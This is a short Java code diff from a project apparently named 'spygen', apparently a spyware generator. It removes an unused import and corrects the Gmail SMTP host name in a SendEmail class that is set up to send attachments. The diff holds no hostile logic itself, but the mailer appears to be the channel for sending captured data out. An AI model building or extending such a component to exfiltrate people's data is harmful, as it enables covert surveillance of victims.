@@ -2,7 +2,6 @@ package com.houarizegai.spygen.mail;
 
 import com.houarizegai.spygen.global.Settings;
 import com.houarizegai.spygen.global.Utils;
-import jdk.nashorn.internal.objects.Global;
 import org.apache.commons.mail.EmailAttachment;
 import org.apache.commons.mail.EmailException;
 import org.apache.commons.mail.MultiPartEmail;
@@ -11,7 +10,7 @@ import java.io.File;
 
 public class SendEmail {
     
-    private static final String SMTP = "SMTP.gmail.com";
+    private static final String SMTP = "smtp.gmail.com";
     private static final String PORT = "587";
     private static final boolean SSL = true;
     private static final boolean DEBUG = false;
